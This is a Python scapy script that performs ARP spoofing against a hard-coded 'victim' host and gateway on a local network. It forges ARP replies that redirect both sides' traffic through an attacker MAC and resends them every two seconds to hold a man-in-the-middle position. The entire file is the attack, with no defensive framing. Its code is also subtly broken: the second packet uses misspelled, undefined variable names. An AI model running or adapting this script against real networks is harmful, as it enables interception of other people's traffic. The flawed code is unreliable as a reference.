import socket
from whois import whois
from scapy.all import *
def main():
    gatewayIP = "192.168.82.2"
    victimIP = "192.168.82.156"
    hackMAC = "00:0c:29:f5:eb:46"
    victimMAC = "00:0c:29:08:17:1c"
    gatewayMAC = "00:50:56:e4:33:f2" #print(getmacbyip("192.168.82.2"))能得到网关的MAC地址

    packet1 = Ether(src=hackMAC,dst=victimMAC)/ARP(hwsrc=hackMAC,hwdst=victimMAC,psrc=gatewayIP,pdst=victimIP,op=2)
    packet2 = Ether(src=hackMAC,dst=gatewayMAC)/ARP(hwsrc=hackMAC,hwdst=getawayMAC,psrc=victimIP,pdst=getawayIP,op=2)
    while 1:
        sendp(packet1,iface="eth0",verbose=0)
        sendp(packet2,iface="eth0",verbose=0)
        time.sleep(2)
        print(packet1.show())
        print(packet2.show())
    pass
if __name__ == '__main__':
    main()